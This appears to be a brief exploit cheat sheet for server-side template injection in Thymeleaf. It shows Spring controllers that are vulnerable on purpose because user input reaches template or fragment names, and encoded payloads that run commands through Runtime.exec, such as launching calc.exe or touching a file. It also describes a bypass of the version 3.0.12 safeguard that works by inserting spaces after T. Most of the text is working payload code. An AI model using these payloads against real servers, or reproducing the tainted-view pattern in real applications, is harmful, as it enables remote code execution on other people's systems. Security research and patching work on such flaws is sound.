# Thymeleaf

```java
    //GET /path?lang=en HTTP/1.1
    //GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
    @GetMapping("/path")
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
```

![image-20220226203203498](exp/image-20220226203203498.png)

```java
    //GET /fragment?section=main
    //GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x
    @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section; //fragment is tainted
    }
```

https://paper.seebug.org/1332/

```java

# Thymeleaf 3.0.12 RCE Bypass

问题详情可以见：https://github.com/thymeleaf/thymeleaf/issues/828

通过更改表达式可以进行绕过安全检查，在T和(之间添加若干个空格字符即可绕过检查进行RCE。
                      
//GET /doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);
}
```

